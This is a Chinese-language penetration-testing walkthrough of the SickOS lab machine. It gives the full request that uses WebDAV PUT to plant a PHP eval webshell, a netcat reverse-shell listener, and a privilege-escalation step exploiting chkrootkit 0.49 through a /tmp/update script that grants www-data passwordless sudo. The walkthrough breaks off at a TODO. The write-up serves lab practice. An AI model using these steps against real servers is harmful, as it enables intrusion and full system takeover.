靶机 IP `192.168.1.206`
`nmap`扫描结果
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 02:04 EST
Nmap scan report for 192.168.1.206 (192.168.1.206)
Host is up (0.00059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
MAC Address: 08:00:27:90:8E:6A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
```
`nikto`发现脆弱方法 OPTIONS
```bash
nikto -h http://192.168.1.206
```
![[sickos-nikto.png]]
Burp 发送请求
```http
OPTIONS /test/ HTTP/1.1
Host: 192.168.1.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1


```
```
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Connection: close
Date: Mon, 08 Dec 2025 06:32:09 GMT
Server: lighttpd/1.4.28
```
![[sickos-options.png]]
发现脆弱方法 PUT，可上传 WebShell
```http
PUT /test/backdoor.php HTTP/1.1
Host: 192.168.1.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 32

<?php @eval($_REQUEST[0]);?>
```
![[sickos-webshell.png]]用 Antsword 连接
![[sickos-antsword.png]]
按同样的方法上传 Reverse Shell：
1. 先用 Burp 上传反弹 Shell 至 `/test/reverse.php`
![[sickos-reverse_shell.png]]
2. 监听端口
```bash
sudo nc -lvnp 443
```
3. 另开终端，输入
```bash
curl http://192.168.1.206/test/reverse.php
```
拿到 `$` 提示符。

信息搜集：
```bash
ifconfig     # IP
whoami
id
uname -a     # 系统信息
ps -aux      # 进程列表
```
检查进程列表时发现
```
root      1008  0.0  0.0   2616   908 ?        Ss   22:59   0:00 cron
```
发现 root 用户存在系统定时任务，查看定时任务配置文件
```bash
cat /etc/crontab
ls -lA /etc/cron*
```
![[sickos-croncheck.png]]
```
-rwxr-xr-x 1 root root  2032 Jun  4  2014 chkrootkit
```
发现敏感文件 `chkrootkit`[^1]，查看其版本
```bash
chkrootkit -V
```
```
chkrootkit version 0.49
```
搜索漏洞
```
searchsploit chkrootkit 0.49
```
![[sickos-chkrootkit_exp.png]]
豁然开朗。
只需用 Antsword 添加`/tmp/update`，并更改权限为`0777`
```bash
#!/bin/bash
echo "%www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```
![[sickos-update.png]]
TODO


---
[^1]:`chkrootkit`是一款**用于 [Linux/Unix系统](https://www.google.com/search?q=Linux%2FUnix%E7%B3%BB%E7%BB%9F&sca_esv=0e6f6e2963ac54c7&sxsrf=AE3TifMlMw9gERE7dlnTw9i3zVOoOdXTNA%3A1765180663224&ei=94Q2aeC4DYmmi-gPt5PikAM&ved=2ahUKEwj9lcW2wq2RAxVA4wIHHZs1HLoQgK4QegQIARAB&uact=5&oq=chkrootkit%E6%98%AF%E4%BB%80%E4%B9%88&gs_lp=Egxnd3Mtd2l6LXNlcnAiE2Noa3Jvb3RraXTmmK_ku4DkuYgyBxAjGLACGCcyBxAAGIAEGA0yBxAAGIAEGA0yBxAAGIAEGA0yBxAAGIAEGA0yBxAAGIAEGA0yBxAAGIAEGA0yBhAAGA0YHjIGEAAYDRgeMgYQABgNGB5IpRJQkwdY5A5wAXgBkAEAmAHnBaABuA6qAQc0LTEuMS4xuAEDyAEA-AEBmAICoAKfA8ICChAAGLADGNYEGEfCAg0QABiABBiwAxhDGIoFmAMAiAYBkAYKkgcFMS40LTGgB-sMsgcDNC0xuAeaA8IHBTAuMS4xyAcGgAgA&sclient=gws-wiz-serp&mstk=AUtExfBo-2v_QGxoK_YJfE-NPj8vprWZM2_zuxUpMn4l3JUIN9lD6sny9JDfvOLybPXhBcEO-7AXRndkMZ9DBx4Tsd9o2vGKsv0Y_SUIhdAyg7yx4WD6dgIDGuyhcIlGGsGYBaXquS4yuEymuoscyqv5rrsYfqAxk15m41nbYT-QNMVd9-1TQuw6PHxc_GJm-U67rGAUcY5jZ_kZ0KsO_HWyARcMCI9Lv2-0Zm97mcrm4CpOw4iubtissQeqymP_bkZ0FeJ4zmx6RSuMnKW7Ni8wRB7hlkq5z3GvDUXV-GKct85YZ8-VI6QxU7Xm7e0gzv2cHnCbu9R4aGUxEGNFLPxEf6gtJKjRmzDGGb2vwleijCNj&csui=3)的开源**本地**检测工具**，专门用来扫描系统是否存在已知的 **Rootkit (后门木马)** 入侵迹象，通过检查可疑文件、目录、系统命令、网络活动和隐藏进程来帮助管理员确保系统安全。它的核心作用是找出黑客植入的、企图隐藏其存在的恶意软件。
